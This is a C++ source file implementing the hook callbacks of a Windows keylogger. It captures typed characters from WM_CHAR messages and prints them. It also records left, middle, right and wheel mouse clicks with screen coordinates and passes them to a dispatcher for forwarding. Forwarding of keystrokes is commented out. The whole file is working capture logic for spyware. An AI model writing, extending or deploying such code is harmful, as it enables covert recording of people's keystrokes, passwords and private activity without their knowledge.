#include "Keylogger.hpp"

extern HHOOK g_hook[2];

std::shared_ptr<Dispatcher> Keylogger::_disp = NULL;

LRESULT CALLBACK Keylogger::handleKey(int code, WPARAM wParam, LPARAM lParam)
{
	if (code <= 0)
		return CallNextHookEx(g_hook[0], code, wParam, lParam);
	
		MSG *msg = (MSG *)(lParam);

		std::cout << "MSG => " << msg->message << std::endl;
		if (msg->message == WM_CHAR)
		{
			char c =  msg->wParam;

			std::cout << "Char => " << c << std::endl;
//			if (_disp)
//				_disp->dispatch(KeyStroke(std::string(&c, 1)));
		}
	return CallNextHookEx(g_hook[0], code, wParam, lParam);
}

LRESULT CALLBACK Keylogger::handleMouse(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION && lParam && _disp)
	{
		MOUSEHOOKSTRUCT *param = (MOUSEHOOKSTRUCT *)lParam;

		if (param->wHitTestCode == HTCLIENT)
			switch (wParam)
			{
				case WM_LBUTTONDOWN:
					_disp->dispatch(MouseClick(MouseClick::LEFTBUTTON, param->pt.x, param->pt.y));
					break;
				case WM_MBUTTONDOWN:
					_disp->dispatch(MouseClick(MouseClick::MIDDLEBUTTON, param->pt.x, param->pt.y));
					break;
				case WM_RBUTTONDOWN:
					_disp->dispatch(MouseClick(MouseClick::RIGHTBUTTON, param->pt.x, param->pt.y));
					break;
				case WM_MOUSEWHEEL:
					_disp->dispatch(MouseClick(MouseClick::WHEEL, param->pt.x, param->pt.y));
					break;

				default:
					break;
			}
	}
	return CallNextHookEx(g_hook[1], code, wParam, lParam);
}

void Keylogger::setDispatcher(std::shared_ptr<Dispatcher> disp)
{
	_disp = disp;
}